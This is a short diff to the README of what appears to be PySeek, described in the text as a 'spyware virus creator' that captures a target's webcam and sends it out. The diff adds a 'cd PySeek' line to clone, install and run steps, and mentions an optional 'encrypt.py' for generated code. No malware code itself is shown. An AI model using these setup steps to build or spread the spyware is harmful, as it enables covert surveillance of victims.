@@ -8,6 +8,7 @@ PySeek is spyware virus creator that grabs the targets cam and sends it to a dis
 <hr>
 git clone https://github.com/TrapeCipher/PySeek/ <br>
 pip install -r requirements.txt <br>
+cd PySeek <br>
 python3 main.py <br>
 <hr>
 when code generated if you wish you can run the "encrypt.py"
